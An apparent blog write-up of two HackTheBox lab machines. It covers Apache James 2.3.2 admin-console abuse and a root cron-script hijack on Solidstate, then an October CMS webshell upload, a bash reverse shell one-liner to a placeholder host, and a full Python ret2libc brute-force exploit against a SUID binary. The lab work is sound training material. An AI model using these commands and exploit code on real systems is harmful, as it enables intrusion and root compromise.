---
title: "HackTheBox - WriteUp 5"
date: 2019-05-24T18:06:06+08:00
description: "HackTheBox 练手"
featuredImage: "https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp"
categories: ["tech"]
draft: false
displayInMenu: false
displayInList: true
dropCap: false
---

# Solidstate

## Before Attack

```
# Nmap 7.70 scan initiated Fri May 24 05:56:47 2019 as: nmap -A -Pn -p1-65535 -oA solidstate 10.10.10.51

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.2 [10.10.14.2]), 
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
```

Go to `searchsploit james` : `Apache James Server 2.3.2 - Remote Command Execution | exploits/linux/remote/35513.py`

Found this detailed explaination: https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf

Check the exploit code, found that this exploit must be triggered by someone logging into the server.

So, after I `gobuster`-ed this site on 80 port:

```
/images (Status: 301)
/index.html (Status: 200)
/about.html (Status: 200)
/services.html (Status: 200)
/assets (Status: 301)
/README.txt (Status: 200)
/LICENSE.txt (Status: 200)
```

Nothing seems to be useful.

Next, Let's check the smtp via Nmap Script:

```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-24 06:38 UTC
Nmap scan report for 10.10.10.51
Host is up (0.020s latency).

PORT   STATE SERVICE
25/tcp open  smtp
| smtp-enum-users: 
|_  root

Nmap done: 1 IP address (1 host up) scanned in 1.49 seconds
```

That's all we can find now.

## Start attack.

### Get the normal user

According to the exploit code and `nmap` result, `nc 10.10.10.51 4555`, Login with `root:root`, next, Issue a `help`.

`help` tells us that we could use this interface to reset someone's password. I guess the one related to the site is `mindy`. 

Then, reset the password: `setpassword mindy testpass`.

Maybe the user credential is in the mailbox. Check POP3: `telnet 10.10.10.51 110`, Use following code to get the result:

```
USER mindy
PASS testpass
LIST
RETR 2
```

Found the credential in the mail content, trying to login in SSH. Success. You are running under a `rbash` with only `env` & `ls` & `cat` available.

```
username: mindy
pass: P@55W0rd1!2@
```

### Use the exploit code below

The above exploit code we just found can be used here.

Just modify the payload inside the exploit to receive a reverse shell. Then, use Python to spawn a tty. Set `$PATH` and `$TERM`.

### Privilege Escalation

Use `LinEnum.sh`, found a 777 file called `/opt/tmp.py` used for clean the `/tmp`, Check again, owned by `root:root`.

You can also use `pspy` to find this.

What's behind?

`cat /etc/crontab`

```
# m h  dom mon dow   command
*/3 * * * * python /opt/tmp.py

-rwxrwxrwx  1 root root 104 Aug 22 2017 03:38 tmp.py
```

Just that.

So modify `os.system()` in this file to get whatever you want.

(END)

# October

## Port Scan

80+22. Use Apache with October CMS.

## Searchsploit

Running a search, found multiple exploits in October CMS 1.0.412. Try default login credentials `admin:admin`, then use upload vulnerabilities to bypass in a `.php5` file. The shell php file path should be `http://10.10.10.16/storage/app/media/shell.php5`

## Reverse shell

Use Antsword to connect and manage webshell, Run `nc` to get port listened, and next create connection `bash -c 'bash -i &>/dev/tcp/YOUR-IP/YOUR-PORT 0<&1'`

## Buffer Overflow Privilege Escalation

Run LinEnum to enumerate, SUID files seems something wrong.

There's a file called `/usr/local/bin/ovrflw`.

First of all, run `checksec -k` to check that ASLR+NX/DEP has enabled on the box.

Next, Download the binary, and then `gdb ./ovrflw`.

Use `set disassembly-flavor intel` then `disas main` to get the main function assembly code. You just see `strcpy`. TIPS: `info frame` may helps you do check the registers. `break *ADDR` to put a breakpoint. `p system` to get address of system.

Then `/opt/metasploit/tools/exploit/pattern_create.rb -l 150` create a 150-chars long string, next, use `r <CHARS>` to run.

Before we go on, we need to know something about the memory of an application

### Knowledge about application memory

Application memory is something like this:

```
+------------------+
|       HEAP       | Dynamic memory
+------------------+
|       STACK      | Function calls / Local vars
+------------------+
| Static / Global  | Global variables
+------------------+
|     Base Code    | Instructions
+------------------+
```

In other word, you just input a variable and then you may cover the original code, when CPU executed the address in EIP, you will get a segmentation fault (or call up a shell).

In order to prevent some hardcoded barrier like this:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
        char buffer[64];
        unsigned int ret;

        printf("input path please: "); fflush(stdout);

        gets(buffer);

        ret = __builtin_return_address(0);

        if((ret & 0xbf000000) == 0xbf000000) {
                printf("bzzzt (%p)\n", ret);
                _exit(1);
        }

        printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
        getpath();
}
```

Here, we need to do `ret2libc` to cross it:

> ret2libc

> So what is “ret2libc” ? If we take the word itself : “ret” is return , “2” means to and “libc” is the C library. The idea behind ret2libc is instead of injecting shellcode and jumping to the address that holds that shellcode we can use the functions that are already in the C library. For example we can call the function system() and make it execute /bin/sh. (Read about system() here). We will also need to use the function exit() to make the program exit cleanly. (Read about exit() here).

> So finally our attack payload will be : “padding –> address of system() –> address of exit() –> /bin/sh” instead of : “padding –> new return address –> NOP –> shellcode”.

About the NOP inside:

> NOP (No Operation)
> Basically no operation is used to make sure that our exploit doesn’t fail ,  **because we won’t always point to the right address , so we add stuff that doesn’t do anything and we point to them** , Then when the program executes it will reach those NOPs and keeps executing them (does nothing) until it reaches the shellcode.

Now, let's get back to the box.

## Privilege Escalation via Overflow

After you get this program crashed, you can see EIP with filled with our input (0x41366441, which means 'Ad6A'). Then use `./pattern_offset.rb -q 41366441 -l 150`, you got the offset 112.

Now when we try to insert shellcode into the buffer but we were unable to execute it because of DEP. It prevents code from being executed in the stack. 

Now we are going to do a `ret2libc` attack to execute a process already present in the process’ executable memory. 

We go into the target machine and find ASLR in enabled so we have to brute force the address. Now we find the address of system, exit and /bin/sh.

Execute the code:

```bash
$ aslistcmd
$ cat /proc/sys/kernel/randomize_va_space
$ readelf -l /usr/local/bin/ovrflw
$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
$ strings -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh 
```

ASLR confirmed to be enabled.

![ovrflw1](https://alicdn.kmahyyg.xyz/asset_files/aslr-bufferovr1.webp)

![ovrflw2](https://alicdn.kmahyyg.xyz/asset_files/aslr-bufferovr2.webp)

<del>By the way, I tried to use the gcc to compile another exploit from exploit-db to use a kernel vulnerability to achieve the local privilege escalation. But this bo x doesn't install the kernel header package. So failed.</del>

Due to the ASLR, we have to bruteforce to let the program run our exploitcode. Just use the script below:

```python
import struct, subprocess

libcBase = 0xb75eb000
systemOffset = 0x00040310
binShOffset = 0x00162bac

libcAddress = struct.pack("<I", libcBase+systemOffset)
exitAddress = struct.pack("<I", 0xd34db33f)
binShAddress = struct.pack("<I", libcBase+binShOffset)

payload = "\x90" * 112
payload += libcAddress
payload += exitAddress
payload += binShAddress

i = 0

while True:
    i += 1
    if i%10 == 0:
        print "Attempts: " + str(i)
    subprocess.call(["/usr/local/bin/ovrflw", payload])

```

After you get the root shell, the script will get blocked until you release it.

ROOTED!

# Suggests to read

- https://0xrick.github.io/binary-exploitation/ 这个系列的 1、6、5 三篇必读！
- http://shell-storm.org/shellcode/  Shellcode 集合
- You may need 'gdb-peda'
- https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/  Practical example
